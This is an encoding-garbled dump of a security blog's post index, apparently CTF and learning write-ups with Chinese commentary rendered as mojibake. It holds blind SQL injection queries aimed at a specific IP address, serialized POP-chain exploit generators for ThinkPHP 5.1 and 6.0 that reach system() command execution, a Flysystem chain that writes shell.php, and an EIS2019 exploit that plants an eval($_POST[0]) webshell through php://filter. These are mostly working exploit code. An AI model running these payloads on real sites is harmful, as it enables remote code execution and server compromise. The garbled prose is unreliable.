é¢˜ç›®æ—¢ç„¶æç¤ºè®©æˆ‘ä»¬postä¸œè¥¿è¿‡å»ï¼Œæˆ‘ä»¬å°±å°è¯•ç€è¯•è¯•çœ‹ã€‚ã€‚ 12345678&#123; &quot;timestamp&quot;: 1619772427543, &quot;status&quot;: 500, &quot;error&quot;: &quot;Internal Server Error&quot;, &quot;exception&quot;: &quot;com.fasterxml.jackson.databind.JsonMappingException&quot;, &quot;message&quot;: &quot;Unexpected token (END_ARRAY), expected VALUE_STRING: need JSON String that contains type id (for subtype of java.lang.Object)\\n at [Source: []; line: 1, column: 2]&quot;, &quot;path&quot;: &quot;/;/json&quot;&#125; ç™¾åº¦çœ‹çœ‹jackson æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œæ‰¾åˆ°è¿™ç¯‡æ–‡ç« ï¼š 12https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;182695https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;5792 æ–‡ç« ä¸­æåˆ°jacksonåå°„åº“ä¼šç›´æ¥ååºåˆ—åŒ–æ‰æˆ‘ä»¬çš„è¾“å…¥.. ä½†æ˜¯æ–‡ç« ä¸­ç»™å‡ºçš„æ“ä½œæ˜¯JDBCçš„ï¼Œ å†çœ‹çœ‹ç»™å‡ºçš„å‡ ä¸ªä¾‹å­ï¼ŒæŠ„è¿‡æ¥å‘ç°å¹¶æ²¡æœ‰å•¥ç”¨ã€ æ„Ÿè§‰è‡ªå·±ä¸ä¼šçš„ä¸œè¥¿è¿˜æ˜¯å¤ªå¤šäº†ã€‚ã€‚ã€‚ æ¥ç€è®°å½•mysqlçš„è¯­å¥ï¼š 1select * from websites where id&#x3D;1||if((ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)&#x3D;(database())),1,1)))&gt;100,1,0); è¯­å¥ï¼š 1http:&#x2F;&#x2F;39.96.91.106:5001&#x2F;?id&#x3D;%27||if((ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)&#x3D;(database())),1,1)))&gt;0,1,0)%23 ä»¥åŠï¼š 1select * from websites where id&#x3D;1||if((ascii(substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name)in(database())),1,1)))&gt;131,1,0); 1||if((ascii(substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name)in(database())),1,1)))&gt;1,1,0)","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"thinkphp5.1ååºåˆ—åŒ–é“¾æ¢ç´¢","slug":"thinkphp5-1ååºåˆ—åŒ–é“¾æ¢ç´¢","date":"2021-03-31T11:12:18.000Z","updated":"2021-03-31T11:49:04.974Z","comments":true,"path":"2021/03/31/thinkphp5-1ååºåˆ—åŒ–é“¾æ¢ç´¢/","link":"","permalink":"http://example.com/2021/03/31/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8E%A2%E7%B4%A2/","excerpt":"","text":"è¯¥é“¾çš„æ€è·¯ä¸ºä»Windows.phpè§¦å‘ï¼Œå…·æœ‰æ‹¼æ¥çš„file_existsè¿›è¡Œæ“ä½œï¼Œä¹‹åæ‹¼æ¥åˆ°Conversion.phpä¸Šï¼Œè¿™é‡Œè‡ªå·±è¿˜åˆšå¤ç°åˆ°ä¸€åŠï¼Œä¸»è¦è®²ä¸€ä¸‹è‡ªå·±é‡è§çš„å›°éš¾ï¼ˆå¯èƒ½åªæœ‰æˆ‘ä¼šé‡è§çš„é—®é¢˜ï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace think\\model\\concern&#123; trait Conversion&#123;&#125;&#125;namespace think&#123; abstract class Model&#123; use model\\concern\\Conversion; &#125;&#125;namespace think\\model&#123; use think\\Model; class Pivot extends Model&#123; &#125;&#125;namespace think\\process\\pipes&#123; class Windows extends Pipes&#123; private $files=[]; public function __construct($files=[])&#123; $this-&gt;files = $files; &#125; &#125; abstract class Pipes&#123;&#125; &#125;namespace&#123; $pivot = new think\\model\\Pivot(); $windows = new think\\process\\pipes\\Windows(array($pivot)); echo urlencode(serialize($windows)); &#125; é¦–å…ˆï¼Œæˆ‘é‡è§ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•è°ƒç”¨åˆ°åˆ«çš„å±æ€§ï¼Œå…¶å®ç”¨useå³å¯ã€‚ ç¬¬äºŒï¼Œæ˜¯æˆ‘ä»¬å¦‚ä½•è°ƒç”¨ä¸€ä¸ªtraitï¼Œè¿™ç§çš„è¯ä¸€èˆ¬æˆ‘ä»¬è¦å¯»æ‰¾ä¸€ä¸ªuseåˆ°è¯¥å±æ€§çš„ç±»ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬æ‰¾åˆ°Modelç±»ä½¿ç”¨äº†è¯¥ç±»ï¼Œä½†æ˜¯modelä¹Ÿæ˜¯æŠ½è±¡ç±»æ²¡åŠæ³•å®ä¾‹åŒ–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å†æ‰¾modelçš„å­—ç±»ï¼Œè¿™é‡Œå°±æ‰¾åˆ°äº†Pivotç±»ï¼Œæ•…æˆ‘ä»¬çš„å†™æ³•å°±å¦‚ä¸Š = =å·²ç»æ‰¾ä¸åˆ°è¿™ä¸ªç‰ˆæœ¬äº†ï¼Œå®˜æ–¹å¦‚æœä¸‹è½½5.1çš„æ‰€æœ‰ç‰ˆæœ¬éƒ½æ‰¾ä¸åˆ°äº†","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"thinkphp6.0.xååºåˆ—åŒ–å­¦ä¹ ","slug":"thinkphp6-0-xååºåˆ—åŒ–å­¦ä¹ ","date":"2021-03-30T03:13:51.000Z","updated":"2021-05-06T12:06:27.326Z","comments":true,"path":"2021/03/30/thinkphp6-0-xååºåˆ—åŒ–å­¦ä¹ /","link":"","permalink":"http://example.com/2021/03/30/thinkphp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"POP1è¿™åœ¨æ¡é“¾å½“ä¸­ï¼Œæˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯åˆ©ç”¨è¿™é‡Œè¿›è¡Œä»»æ„å‡½æ•°è°ƒç”¨ï¼Œå› ä¸ºä¸‰ä¸ªå‚æ•°å…¨éƒ¨å¯æ§æ‰€ä»¥æˆ‘ä»¬èƒ½å¤ŸæˆåŠŸæ“ä½œ æˆ‘ä»¬æ¥ä¸‹æ¥å°±æ‰¾å“ªé‡Œå¯ä»¥è§¦å‘è¿™é‡Œï¼š ä¹‹åå°†ä¼šåœ¨getAtträ¸­æ‰¾åˆ°è¿™é‡Œï¼š 123456789101112public function getAttr(string $name) &#123; try &#123; $relation = false; $value = $this-&gt;getData($name); &#125; catch (InvalidArgumentException $e) &#123; $relation = $this-&gt;isRelationAttr($name); $value = null; &#125;// ä¸Šé¢èµ°å®Œå›æ¥ç»§ç»­æ‰§è¡ŒgetValue return $this-&gt;getValue($name, $value, $relation); &#125; å…ˆä¸ç®¡å¦‚ä½•æ§åˆ¶å‚æ•°ï¼Œæˆ‘ä»¬å†å¯»æ‰¾å¦‚ä½•è§¦å‘åˆ°getAttrï¼Œæœ€åæˆ‘ä»¬å°±å°†åœ¨Conversion.phpå½“ä¸­æ‰¾åˆ°toArrayã€‚ ä¸­é—´çš„ä»£ç å¾ˆå¤šä½†æ˜¯æ²¡å•¥ç”¨ 1234567891011121314151617181920212223public function toArray(): array &#123; foreach ($data as $key =&gt; $val) &#123; if ($val instanceof Model || $val instanceof ModelCollection) &#123; // å…³è”æ¨¡å‹å¯¹è±¡ if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) &#123; $val-&gt;visible($this-&gt;visible[$key]); &#125; elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) &#123; $val-&gt;hidden($this-&gt;hidden[$key]); &#125; // å…³è”æ¨¡å‹å¯¹è±¡ if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) &#123; $item[$key] = $val-&gt;toArray(); &#125; &#125; elseif (isset($this-&gt;visible[$key])) &#123; $item[$key] = $this-&gt;getAttr($key); #TODO: æœ€åæˆ‘ä»¬è¦è®©ä»–è°ƒåˆ°è¿™ä¸ªgetAttrå‡½æ•°æ¥æ¥ &#125; elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123; // phpinfo(); $item[$key] = $this-&gt;getAttr($key); &#125; &#125; é‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹å¦‚ä½•è§¦å‘toArrayï¼Œæœ€åæˆ‘ä»¬å°±ä¼šå‘ç°åœ¨__toStringæ—¶å¯ä»¥è§¦å‘ï¼Œæ•…æˆ‘ä»¬å°†å…¶downä¸‹æ¥. 12345678910 public function toJson(int $options = JSON_UNESCAPED_UNICODE): string &#123; return json_encode($this-&gt;toArray(), $options); &#125;#TODO: Conversion.phpä½œä¸ºååŠæ®µèµ·ç‚¹ï¼Œé€šè¿‡toStringè§¦å‘ public function __toString() &#123; return $this-&gt;toJson(); &#125; æ‰€ä»¥å†ä¹‹åæˆ‘ä»¬å°±éœ€è¦å¯»æ‰¾å¯ä»¥ä»»æ„æ§åˆ¶å‚æ•°çš„__toStringæ–¹æ³•ã€‚åœ¨Modelæ–¹æ³•å½“ä¸­å¯ä»¥å¯»æ‰¾åˆ° 123456789public function __destruct() &#123; #TODO: ä»è¿™é‡Œè§¦å‘ if ($this-&gt;lazySave) &#123; $this-&gt;save(); echo &quot;è¿›å…¥lazySaveå‡½æ•°ï¼&quot;.&quot;&lt;br&gt;&quot;; &#125; &#125; æ‰¾åˆ°saveå‡½æ•° 123456789101112131415161718public function save(array $data = [], string $sequence = null): bool &#123; // æ•°æ®å¯¹è±¡èµ‹å€¼ // phpinfo(); $this-&gt;setAttrs($data); if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#x27;BeforeWrite&#x27;)) &#123; // phpinfo(); return false; &#125; // phpinfo(); #TODO: lazySaveå‡½æ•°ï¼Œä¸ºäº†ä¿è¯isEmptyä¸ºå‡éœ€è¦ç»™dataèµ‹å€¼ $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence); if (false === $result) &#123; return false; &#125; æˆ‘ä»¬éœ€è¦è½åˆ°updateDataå‡½æ•°å½“ä¸­ 1234567891011121314151617181920212223242526272829303132333435protected function updateData(): bool &#123; // äº‹ä»¶å›è°ƒ // phpinfo(); // echo &quot;è¿›å…¥updateDateå‡½æ•°&quot;.&quot;&lt;br&gt;&quot;; if (false === $this-&gt;trigger(&#x27;BeforeUpdate&#x27;)) &#123; // phpinfo(); return false; &#125; // phpinfo(); $this-&gt;checkData(); // è·å–æœ‰æ›´æ–°çš„æ•°æ® $data = $this-&gt;getChangedData(); if (empty($data)) &#123; // å…³è”æ›´æ–° if (!empty($this-&gt;relationWrite)) &#123; $this-&gt;autoRelationUpdate(); &#125; return true; &#125; if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime &amp;&amp; !isset($data[$this-&gt;updateTime])) &#123; // è‡ªåŠ¨å†™å…¥æ›´æ–°æ—¶é—´ $data[$this-&gt;updateTime] = $this-&gt;autoWriteTimestamp($this-&gt;updateTime); $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime]; &#125; // æ£€æŸ¥å…è®¸å­—æ®µ // phpinfo(); $allowFields = $this-&gt;checkAllowFields(); // phpinfo(); æˆ‘ä»¬è¦ç¡®ä¿è°ƒåˆ°checkAllowFieldså‡½æ•°å½“ä¸­ 123456789101112131415161718192021protected function checkAllowFields(): array &#123; // æ£€æµ‹å­—æ®µ // phpinfo(); // var_dump($this-&gt;field); if (empty($this-&gt;field)) &#123; if (!empty($this-&gt;schema)) &#123; #TODO: // phpinfo(); $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType)); &#125; else &#123; // å°±åœ¨è¿™é‡Œè¿›è¡Œäº†å­—ç¬¦ä¸²æ“ä½œ $table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable(); // phpinfo(); $this-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table); &#125; // phpinfo(); return $this-&gt;field; åœ¨è¿™é‡Œæˆ‘ä»¬å‘ç°å…³é”®çš„åœ°æ–¹å°±è¿›è¡Œäº†å­—ç¬¦ä¸²æ‹¼æ¥æ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬ä»¤$this-&gt;table ä¸ºmodelç±»å³å¯ï¼Œä½†æ˜¯å®é™…æ‹¼æ¥payloadå½“ä¸­æˆ‘ä»¬ä¼šå‘ç°è¯¥ç±»æ— æ³•ç›´æ¥ä½¿ç”¨ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°å¯»æ‰¾å­ç±» æœ€ç»ˆå¾—åˆ°ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phpnamespace think\\model\\concern;trait Conversion&#123;&#125;trait Attribute&#123; private $data; private $withAttr = [&quot;axin&quot; =&gt; &quot;system&quot;]; public function get() &#123; $this-&gt;data = [&quot;axin&quot; =&gt; &quot;ls&quot;]; //ä½ æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè¿™é‡Œçš„é”®å€¼åªéœ€è¦ä¿æŒå’ŒwithAttré‡Œçš„é”®å€¼ä¸€è‡´å³å¯ &#125;&#125;namespace think;abstract class Model&#123; // use model\\concern\\Attribute; use model\\concern\\Conversion; private $lazySave; private $exists; private $data; private $field; private $schema; private $table; function __construct()&#123; $this-&gt;lazySave = true; $this-&gt;withEvent = false; $this-&gt;exists = true; // $this-&gt;get(); $this-&gt;field = []; $this-&gt;schema = []; $this-&gt;table = true; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123; function __construct($obj=&#x27;&#x27;) &#123; parent::__construct(); $this-&gt;table = $obj; &#125;&#125;$a = new Pivot();$b = new Pivot($a);echo urlencode(serialize($b)); æœ€åè‡ªå·±å†™çš„~ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpnamespace think&#123; abstract class Model&#123; use model\\concern\\Conversion; use model\\concern\\Attribute; protected $json = [&quot;foo&quot;]; private $lazySave =true; private $exists = true; protected $visible = [&quot;foo&quot;]; private $relation = [&quot;foo&quot;=&gt;&quot;12qw3&quot;]; private $data = [&#x27;foo&#x27; =&gt;[&quot;ysllz&quot;=&gt;&quot;dir&quot;]]; //æœ€ç»ˆè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œysllz è¿™é‡Œè¦ä¿æŒä¸€è‡´ã€‚ private $table; private $withAttr = [&quot;foo&quot;=&gt;[&quot;ysllz&quot;=&gt;&quot;system&quot;]]; protected $jsonAssoc = true; &#125;&#125;namespace think\\model&#123; use think\\Model; class Pivot extends Model&#123; public function __construct($a= null) &#123; $this-&gt;table =$a; &#125; &#125;&#125;namespace think\\model\\concern&#123; trait Conversion&#123; &#125; trait Attribute&#123; &#125;&#125;namespace &#123; use think\\model\\Pivot; $pivot1 = new Pivot(); $pivot2 = new Pivot($pivot1); echo urlencode(serialize($pivot2));&#125; åé¢åœ¨è¿‡å®¢å¸ˆå‚…è¿™é‡Œåˆæ‰¾åˆ°ä¸¤ä¸ªPOPé“¾ï¼Œæ„Ÿè§‰å¾ˆç‰›èµ¶ç´§å¤ç°äº† POP2è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶å†™å…¥çš„ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpnamespace League\\Flysystem\\Cached&#123; interface CacheInterface &#123;&#125;&#125;namespace League\\Flysystem\\Cached\\Storage&#123; use League\\Flysystem\\Cached\\CacheInterface; abstract class AbstractCache implements CacheInterface&#123; protected $autosave = false; &#125; class Adapter extends AbstractCache&#123; protected $complete=&quot;&lt;?php phpinfo(); ?&gt;&quot;; //æ³¨æ„è¿™é‡Œæœ‰jsonencode,ä½†æ˜¯ä¸å½±å“ protected $adapter; protected $file = &quot;shell.php&quot;; public function __construct($a) &#123; $this-&gt;adapter = $a; &#125; &#125;&#125;namespace League\\Flysystem\\Adapter&#123; abstract class AbstractAdapter&#123; &#125; class Local extends AbstractAdapter&#123; protected $pathPrefix =&#x27;&#x27;; protected $writeFlags =null; &#125;&#125;namespace&#123; use League\\Flysystem\\Adapter\\Local; use League\\Flysystem\\Cached\\Storage\\Adapter; $loc = new Local(); $ada = new Adapter($loc); echo urlencode(serialize($ada));&#125; å•Šæ„Ÿè§‰è¿˜æ˜¯å­¦åˆ°äº†æ–°å§¿åŠ¿ï¼Œé¦–å…ˆå¯ä»¥é€šè¿‡æ‰¾å­—ç±»å®ç°äº†æ¥å£ï¼Œæ‰€ä»¥ä¸è¦çœ‹åˆ°æœ‰çš„æŠ½è±¡ç±»çš„saveæ— æ³•ä½¿ç”¨å°±æ”¾å¼ƒäº†ï¼Œå…¶å®ä¹Ÿå¯ä»¥çš„ã€‚ å…¥å£åœ¨AbstractCacheçš„destructä¸‹é¢ 123456789 public function __destruct() &#123;// phpinfo();// var_dump($this-&gt;autosave); if (! $this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125; ç„¶åå‘ç°saveæ²¡æ³•è¿‡å»ï¼Œæ•…æ‰¾ä¸€ä¸ªå­—ç±»ç»§æ‰¿äº†çˆ¶ç±»çš„ï¼Œæ‰¾åˆ° çœ‹åˆ°save ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯writeï¼Œæ‰€ä»¥å…¨å±€æœç´¢writeï¼Œæ‰¾åˆ°å­ç±»Local é‡ç‚¹å°±æ˜¯è¿™ä¸ªfile_put_contents,ç„¶åæˆ‘ä»¬å‘ç°è¿™ä¸‰ä¸ªå‚æ•°éƒ½å¯ä»¥æ§åˆ¶= =ï¼Œä½†æ˜¯é¢ä¸´ä¸€ä¸ªé—®é¢˜ã€‚ 1234 if ($this-&gt;adapter-&gt;has($this-&gt;file)) &#123;// phpinfo(); $this-&gt;adapter-&gt;update($this-&gt;file, $contents, $config); &#125; else &#123; å› ä¸ºä¼šæœ‰$this-&gt;fileï¼Œå¦‚æœæˆ‘ä»¬èµ‹å€¼çš„è¯å°±ä¸ä¼šè¿›å…¥äº†ï¼Œç„¶è€Œç„¶è€Œï¼Œæˆ‘åˆåœ¨å½“å‰ç±»æ‰¾äº†æ‰¾updateæ–¹æ³•ï¼Œå‡ºä¹æ„æ–™çš„ æ¬¸ï¼Œä¹Ÿèƒ½å†™å…¥ï¼Œæ‰€ä»¥ç›´æ¥å†™è¿›å°±å¥½äº†ï¼Œæ„é€ expå‡ºæ¥å°±æœ‰äº†ã€‚ ç»“æœï¼š","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"EIS2019_EZPOP","slug":"EIS2019-EZPOP","date":"2021-03-26T11:41:30.000Z","updated":"2021-03-26T11:44:42.234Z","comments":true,"path":"2021/03/26/EIS2019-EZPOP/","link":"","permalink":"http://example.com/2021/03/26/EIS2019-EZPOP/","excerpt":"","text":"é¢˜ç›®å¼€å±€ç»™æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123&lt;?phperror_reporting(0);class A &#123; protected $store; protected $key; protected $expire; public function __construct($store, $key = &#x27;flysystem&#x27;, $expire = null) &#123; $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; &#125; public function cleanContents(array $contents) &#123; $cachedProperties = array_flip([ &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;, &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;, ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125; return $contents; &#125; public function getForStorage() &#123; $cleaned = $this-&gt;cleanContents($this-&gt;cache); return json_encode([$cleaned, $this-&gt;complete]); &#125; public function save() &#123; $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); &#125; public function __destruct() &#123; if (!$this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125;&#125;class B &#123; protected function getExpireTime($expire): int &#123; return (int) $expire; &#125; public function getCacheKey(string $name): string &#123; return $this-&gt;options[&#x27;prefix&#x27;] . $name; &#125; protected function serialize($data): string &#123; if (is_numeric($data)) &#123; return (string) $data; &#125; $serialize = $this-&gt;options[&#x27;serialize&#x27;]; return $serialize($data); &#125; public function set($name, $value, $expire = null): bool&#123; $this-&gt;writeTimes++; if (is_null($expire)) &#123; $expire = $this-&gt;options[&#x27;expire&#x27;]; &#125; $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) &#123; try &#123; mkdir($dir, 0755, true); &#125; catch (\\Exception $e) &#123; // åˆ›å»ºå¤±è´¥ &#125; &#125; $data = $this-&gt;serialize($value); if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123; //æ•°æ®å‹ç¼© $data = gzcompress($data, 3); &#125; $data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; $result = file_put_contents($filename, $data); if ($result) &#123; return true; &#125; return false; &#125;&#125;if (isset($_GET[&#x27;src&#x27;]))&#123; highlight_file(__FILE__);&#125;$dir = &quot;uploads/&quot;;if (!is_dir($dir))&#123; mkdir($dir);&#125;unserialize($_GET[&quot;data&quot;]); ä¸€çœ¼å°±çœ‹åˆ°äº†file_put_contentsï¼Œé‚£ä¹ˆåˆ©ç”¨è‚¯å®šä¹Ÿæ˜¯é€šè¿‡è¿™ä¸ªï¼Œå‘ç°ä»–åœ¨setæ–¹æ³•å½“ä¸­ï¼Œå›æº¯å“ªé‡Œèƒ½ç”¨åˆ°setæ–¹æ³•ï¼Œ Aç±»å½“ä¸­è‚¯å®šç»™äº†ï¼š 123456789101112 public function save() &#123; $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); &#125; public function __destruct() &#123; if (!$this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125;&#125; è¿™æ ·å°±ç®€å•äº†ã€‚åªä¸è¿‡é¢˜ç›®è¿˜éœ€è¦ç»•è¿‡ç­‰ç­‰æ¯”è¾ƒçƒ¦ï¼Œbase64æ¯”è¾ƒçƒ¦äººï¼Œå…¶ä»–éƒ½è¿˜å¥½ï¼ˆæŒ‡è°ƒäº†å¥½ä¹…ï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146&lt;?phperror_reporting(0);class A &#123; protected $store; protected $key; protected $expire; public function __construct($store, $key , $expire = null) &#123; $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; &#125; public function cleanContents(array $contents) &#123; $cachedProperties = array_flip([ &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;, &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;, ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125;// var_dump($contents); return $contents; &#125; public function getForStorage() &#123; $cleaned = $this-&gt;cleanContents($this-&gt;cache);// var_dump($cleaned);// print_r(json_encode([$cleaned, $this-&gt;complete])); return json_encode([$cleaned, $this-&gt;complete]); &#125; public function save() &#123; $contents = $this-&gt;getForStorage();// echo $contents; $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); &#125; public function __destruct() &#123; if (!$this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125;&#125;class B &#123; protected function getExpireTime($expire): int &#123; return (int) $expire; &#125; public function getCacheKey(string $name): string &#123; return $this-&gt;options[&#x27;prefix&#x27;] . $name; &#125; protected function serialize($data): string &#123;// phpinfo(); if (is_numeric($data)) &#123; return (string) $data; &#125;// print_r($data); $serialize = $this-&gt;options[&#x27;serialize&#x27;];// print_r($serialize);// print_r($serialize($data)); return $serialize($data); &#125; public function set($name, $value, $expire = null): bool&#123; $this-&gt;writeTimes++;// phpinfo(); if (is_null($expire)) &#123; $expire = $this-&gt;options[&#x27;expire&#x27;]; &#125;// var_dump($name); $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name);// print_r($filename); $dir = dirname($filename);// print_r($dir); if (!is_dir($dir)) &#123; try &#123; mkdir($dir, 0755, true); &#125; catch (\\Exception $e) &#123; // åˆ›å»ºå¤±è´¥ &#125; &#125; $data = $this-&gt;serialize($value);// print_r($data); if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123; //æ•°æ®å‹ç¼© $data = gzcompress($data, 3);// print_r($data); &#125;// print_r($filename); $data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data;// print_r($data);// print_r(base64_decode($data)); $result = file_put_contents($filename, $data); if ($result) &#123;// echo 1; return true; &#125;// echo 1; return false; &#125;&#125;//if (isset($_GET[&#x27;src&#x27;]))//&#123;// highlight_file(__FILE__);//&#125;////$dir = &quot;uploads/&quot;;////if (!is_dir($dir))//&#123;// mkdir($dir);//&#125;$b = new B();$b-&gt;options[&#x27;serialize&#x27;] = &quot;strval&quot;;$b-&gt;options[&#x27;exprie&#x27;] = &quot;1&quot;;$b-&gt;options[&#x27;prefix&#x27;]=&#x27;&#x27;;$b-&gt;options[&#x27;data_compress&#x27;] = null;//key ç»è¿‡è½¬æ¢åå˜æˆfilename//contentsç»è¿‡è½¬æ¢åå†™å…¥åˆ°æ–‡ä»¶å½“ä¸­//$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);$a = new A($b,&#x27;php://filter/write=convert.base64-decode/resource=4.php&#x27;,111);$a-&gt;cache = array(&quot;path&quot;=&gt;&quot;111PD9waHAgZXZhbCgkX1BPU1RbMF0pOz8+&quot;);echo urlencode(serialize($a));","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"ISITDTU2019_EasyPHP","slug":"ISITDTU2019-EasyPHP","date":"2021-03-26T03:31:16.000Z","updated":"2021-03-26T03:49:18.637Z","comments":true,"path":"2021/03/26/ISITDTU2019-EasyPHP/","link":"","permalink":"http://example.com/2021/03/26/ISITDTU2019-EasyPHP/","excerpt":"","text":"å¼€å±€ç»™å‡ºæºç ï¼š 123456789101112&lt;?php$_ = &#x27;&#x27;;if ( preg_match(&#x27;/[\\x00- 0-9\\&#x27;&quot;`$&amp;.,|[&#123;_defgops\\x7F]+/i&#x27;, $_) ) die(&#x27;rosÃ© will not do it&#x27;);if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd ) die(&#x27;you are so close, omg&#x27;);eval($_);?&gt; open_basedirï¼šé™å®šèƒ½æ“ä½œçš„ç›®å½• ç”¨è¿™ä¸ªç½‘ç«™æµ‹è¯•åŒ¹é…äº†ä»€ä¹ˆï¼š 1https:&#x2F;&#x2F;regex101.com&#x2F; è¿™ä¸ªç½‘ç«™å°±æ˜¯è¿™ä¸ªå¥½ï¼š çœ‹äº†å¤§ä½¬çš„WPçŸ¥é“è¿™ä¸ªæ“ä½œï¼Œæ„Ÿè§‰å¾ˆæœ‰ç”¨è®°ä¸‹æ¥ 123456789101112&lt;?php$array=get_defined_functions();//è¿”å›æ‰€æœ‰å†…ç½®å®šä¹‰å‡½æ•°foreach($array[&#x27;internal&#x27;] as $arr)&#123; if ( preg_match(&#x27;/[\\x00- 0-9\\&#x27;&quot;\\`$&amp;.,|[&#123;_defgops\\x7F]+/i&#x27;, $arr) ) continue; if ( strlen(count_chars(strtolower($arr), 0x3)) &gt; 0xd ) continue; print($arr.&#x27;&lt;br/&gt;&#x27;);&#125;?&gt; è¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥å¿«é€Ÿæ‰¾åˆ°æœ‰å“ªäº›å‡½æ•°å¯ä»¥ç”¨äº†ï¼Œä¸è¿‡è¿™é“é¢˜ç»™å‡ºçš„å‡½æ•°å¹¶ä¸èƒ½ç”¨ã€‚ é‚£å°±åªèƒ½å–åæ¥æ“ä½œäº†ï¼š 